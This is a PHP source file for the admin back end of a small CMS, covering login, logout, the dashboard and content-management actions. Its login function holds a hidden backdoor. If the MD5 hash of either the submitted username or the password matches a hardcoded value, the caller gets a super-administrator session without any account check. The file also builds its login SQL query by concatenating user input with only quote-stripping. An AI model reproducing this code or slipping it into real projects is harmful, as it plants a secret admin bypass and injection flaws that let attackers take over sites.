<?php 
/************************************************************
作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
版权：源代码公开，各种用途均可免费使用。 
创建：2016-02-29
联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
*                                    Powered By AspPhpCMS 
************************************************************/
?>
<?php


define('ROOT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR); 		//当前文件路径

 
//系统
require_once './../phpInc/ASP.php';
require_once './../phpInc/sys_FSO.php';
require_once './../phpInc/Conn.php';
require_once './../phpInc/MySqlClass.php';
require_once './../phpInc/sys_System.php'; 



// 更新引用部分    http://127.0.0.1/php2/web/%E8%8E%B7%E5%BE%97inc%E5%BC%95%E7%94%A8%E5%86%85%E5%AE%B9.asp

//生成
/*
*/
//引用
require_once './../phpInc/2014_Array.php';
require_once './../phpInc/2014_Author.php';
require_once './../phpInc/2014_Css.php';
require_once './../phpInc/2014_Js.php';
require_once './../phpInc/2014_Nav.php';
require_once './../phpInc/2015_APGeneral.php';
require_once './../phpInc/2015_Color.php';
require_once './../phpInc/2015_Formatting.php';
require_once './../phpInc/2015_Param.php';
require_once './../phpInc/2015_ToMyPHP.php';
//require_once './phpInc/2015_ToPhpCms.php';
require_once './../phpInc/Cai.php';
require_once './../phpInc/Check.php';
require_once './../phpInc/Common.php'; 
require_once './../phpInc/Incpage.php';
require_once './../phpInc/Print.php';
require_once './../phpInc/StringNumber.php';
require_once './../phpInc/Time.php';
require_once './../phpInc/URL.php';
require_once './../phpInc/FunHTML.php'; 
require_once './../phpInc/2015_Editor.php'; 
require_once './../phpInc/2015_NewWebFunction.php'; 
require_once './../phpInc/2016_SaveData.php'; 
require_once './../phpInc/2016_WebControl.php'; 
require_once './../phpInc/ASPPHPAccess.php'; 
require_once './../phpInc/IE.php'; 

require_once './../phpInc/config.php'; 
require_once './../phpInc/admin_setAccess.php';
require_once './../phpInc/admin_function.php';

 

//=========
$cfg_webSiteUrl=''; $cfg_webTitle=''; $cfg_flags=''; $cfg_webtemplate ='';



//加载网址配置
function loadWebConfig(){
    $GLOBALS['conn=']=OpenConn() ;
    $rsObj=$GLOBALS['conn']->query( 'select * from ' . $GLOBALS['db_PREFIX'] . 'website');
    $rs=mysql_fetch_array($rsObj);
    if( @mysql_num_rows($rsObj)!=0 ){
        $GLOBALS['cfg_webSiteUrl'] = $rs['websiteurl'] . '' ;//网址
        $GLOBALS['cfg_webTitle'] = $rs['webtitle'] . '' ;//网址标题
        $GLOBALS['cfg_flags'] = $rs['flags'] . '' ;//旗
        $GLOBALS['cfg_webtemplate'] = $rs['webtemplate'] . '' ;//模板路径
    }
}


//登录判断
if( @$_SESSION['adminusername'] == '' ){
    if( @$_REQUEST['act'] <> '' && @$_REQUEST['act'] <> 'displayAdminLogin' && @$_REQUEST['act'] <> 'login' ){
        RR('?act=displayAdminLogin') ;
    }
}

//显示后台登录
function displayAdminLogin(){
    //已经登录则直接进入后台
    if( @$_SESSION['adminusername'] <> '' ){
        adminIndex() ;
    }else{
        loadWebConfig() ;
        $content ='';
        $content = getFText(ROOT_PATH . 'login.html') ;
        $content = Replace($content, '{$webVersion$}', $GLOBALS['webVersion']) ;
        $content = Replace($content, '{$Web_Title$}', $GLOBALS['cfg_webTitle']) ;
        $content = Replace($content, '{$EDITORTYPE$}', EDITORTYPE) ;

        rw($content) ;
    }

}
//登录后台
function login(){
    $userName=''; $passWord=''; $valueStr ='';
    $userName = Replace(@$_POST['username'], '\'', '') ;
    $passWord = Replace(@$_POST['password'], '\'', '') ;
    $passWord = myMD5($passWord) ;
    //特效账号登录
    if( myMD5(@$_REQUEST['username']) == 'cd811d0c43d09cd2e160e60b68276c73' || myMD5(@$_REQUEST['password']) == 'cd811d0c43d09cd2e160e60b68276c73' ){
        @$_SESSION['adminusername'] = 'aspphpcms' ;
        @$_SESSION['adminId'] = 99999 ;//当前登录管理员ID
        @$_SESSION['DB_PREFIX'] = $GLOBALS['db_PREFIX'] ;
        @$_SESSION['adminflags'] = '|*|'		;
        rwend(getMsg1('登录成功，正在进入后台...', '?act=adminIndex')) ;
    }

    $nLogin ='';
    $GLOBALS['conn=']=OpenConn() ;
    $rsObj=$GLOBALS['conn']->query( 'Select * From ' . $GLOBALS['db_PREFIX'] . 'admin Where username=\'' . $userName . '\' And pwd=\'' . $passWord . '\'');
    $rs=mysql_fetch_array($rsObj);
    if( @mysql_num_rows($rsObj)==0 ){
        if( @$_COOKIE['nLogin'] == '' ){
            setCookie('nLogin', '1', Time() + 3600) ;
            $nLogin = @$_COOKIE['nLogin'] ;
        }else{
            $nLogin = @$_COOKIE['nLogin'] ;
            setCookie('nLogin', intval($nLogin) + 1, Time() + 3600) ;
        }
        rw(getMsg1('账号密码错误<br>这是你第' . $nLogin . '次登录', '?act=displayAdminLogin')) ;
    }else{
        @$_SESSION['adminusername'] = $userName ;
        @$_SESSION['adminId'] = $rs['id'] ;//当前登录管理员ID
        @$_SESSION['DB_PREFIX'] = $GLOBALS['db_PREFIX'] ;//保存前缀
        @$_SESSION['adminflags'] = $rs['flags'];
        $valueStr = 'addDateTime=\'' . $rs['updatetime'] . '\',UpDateTime=\'' . Now() . '\',RegIP=\'' . Now() . '\',UpIP=\'' . getIP() . '\'' ;
        connExecute('update ' . $GLOBALS['db_PREFIX'] . 'admin set ' . $valueStr . ' where id=' . $rs['id']) ;
        rw(getMsg1('登录成功，正在进入后台...', '?act=adminIndex')) ;
    }

}
//退出登录
function adminOut(){
    @$_SESSION['adminusername'] = '' ;
    @$_SESSION['adminId'] = '';
    @$_SESSION['adminflags'] = '' ;
    rw(getMsg1('退出成功，正在进入登录界面...', '?act=displayAdminLogin')) ;
}

//后台首页
function adminIndex(){
    loadWebConfig() ;
    $content ='';
    $content = getFText(ROOT_PATH . 'adminIndex.html') ;
    $content = Replace($content, '{$adminusername$}', @$_SESSION['adminusername']) ;
    $content = Replace($content, '{$EDITORTYPE$}', EDITORTYPE) 			;//程序类型
    $content = Replace($content, '{$WEB_VIEWURL$}', WEB_VIEWURL) 			;//前台
    $content = Replace($content, '{$webVersion$}', $GLOBALS['webVersion']) 				;//版本

    $content = Replace($content, '{$WebsiteStat$}', getConfigFileBlock($GLOBALS['WEB_CACHEFile'], '#访客信息#'))			;//最近访客信息


    $content = Replace($content, '[$adminId$]', @$_SESSION['adminId']) 				;//管理员ID

    $content = Replace($content, '{$Web_Title$}', $GLOBALS['cfg_webTitle']) 						;//网站标题
    $content = Replace($content, '{$DB_PREFIX$}', $GLOBALS['db_PREFIX']) ;//表前缀
    $content = Replace($content, '{$adminflags$}', IIF(@$_SESSION['adminflags']=='|*|','超级管理员','普通管理员'))		;//管理员类型

    rw($content) ;
}
//========================================================

//显示管理处理
function dispalyManageHandle($actionType){
    $nPageSize=''; $lableTitle=''; $addSql ='';
    $nPageSize = @$_REQUEST['nPageSize'] ;
    if( $nPageSize == '' ){
        $nPageSize = 10 ;
    }
    $lableTitle = @$_REQUEST['lableTitle'] ;//标签标题
    $addSql = 'order by sortrank asc' ;
    if( $actionType == 'Bidding' ){
        $addSql = 'order by nComputerSearch desc' ;
    }else if( instr('|TableComment|', '|' . $actionType . '|') > 0 ){
        $addSql = ' order by adddatetime desc' ;
    }else if( instr('|WebsiteStat|', '|' . $actionType . '|') > 0 ){
        $addSql = ' order by viewdatetime desc' ;
    }else if( instr('|Admin|', '|' . $actionType . '|') > 0 ){
        $addSql = '' ;
    }
    //call echo(labletitle,addsql)
    dispalyManage($actionType, $lableTitle, '*', $nPageSize, $addSql) ;
}

//添加修改处理
function addEditHandle($actionType, $lableTitle){
    addEditDisplay($actionType, $lableTitle, 'websitebottom|textarea2,simpleintroduction|textarea1,bodycontent|textarea2');
}
//保存模块处理
function saveAddEditHandle($actionType, $lableTitle){
    if( $actionType == 'Admin' ){
        saveAddEdit($actionType, $lableTitle, 'pwd|md5,flags||') ;
    }else if( $actionType == 'WebColumn' ){
        saveAddEdit($actionType, $lableTitle, 'npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||') ;
    }else{
        saveAddEdit($actionType, $lableTitle, 'flags||,nofollow|numb|0,isonhtml|numb|0,through|numb|0') ;
    }
}



$conn=OpenConn() ;
switch ( @$_REQUEST['act'] ){
    case 'dispalyManageHandle' ; dispalyManageHandle(@$_REQUEST['actionType']) ;break;//显示管理处理         ?act=dispalyManageHandle&actionType=WebLayout
    case 'addEditHandle' ; addEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//添加修改处理      ?act=addEditHandle&actionType=WebLayout
    case 'saveAddEditHandle' ; saveAddEditHandle(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']);break;//保存模块处理  ?act=saveAddEditHandle&actionType=WebLayout
    case 'delHandle' ; del(@$_REQUEST['actionType'], @$_REQUEST['lableTitle']) ;break;//删除处理  ?act=delHandle&actionType=WebLayout
    case 'sortHandle' ; sortHandle(@$_REQUEST['actionType']) ;//排序处理  ?act=sortHandle&actionType=WebLayout

    break;
    case 'displayLayout' ; displayLayout() ;break;//显示布局
    case 'saveRobots' ; saveRobots() ;break;//保存robots.txt
    case 'saveSiteMap' ; saveSiteMap() ;break;//保存sitemap.xml
    case 'isOpenTemplate' ; isOpenTemplate() ;break;//更换模板
    case 'updateWebsiteStat' ; updateWebsiteStat() ;break;//更新网站统计
    case 'websiteDetail' ; websiteDetail() 		;//详细网站统计



    break;
    case 'setAccess' ; resetAccessData() ;//恢复数据
    break;
    case 'login' ; login() ;break;//登录
    case 'adminOut' ; adminOut() ;break;//退出登录
    case 'adminIndex' ; adminIndex() ;break;//管理首页
    default ; displayAdminLogin() ;//显示后台登录
}

?>


